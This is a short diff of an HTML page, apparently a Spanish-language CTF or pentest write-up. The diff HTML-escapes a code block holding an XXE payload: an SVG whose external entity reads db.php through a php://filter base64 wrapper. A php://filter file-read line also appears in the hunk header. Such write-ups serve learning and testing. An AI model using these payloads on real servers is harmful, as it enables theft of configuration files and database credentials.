@@ -69,15 +69,13 @@ php://filter/convert.base64-encode/resource=<archivo>
   </code>
 </pre>
 
-<pre>
-  <code>
-    <?xml version="1.0" standalone="yes"?>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php" > ]>
-<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
-<text font-size="16" x="0" y="16">&xxe;</text>
-</svg>
-  </code>
-</pre>
+<pre><code>
+&lt;?xml version="1.0" standalone="yes"?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php" &gt; ]&gt;
+&lt;svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;
+  &lt;text font-size="16" x="0" y="16"&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;
+</code></pre>
 
 El contenido que nos interesa está en db.php
 
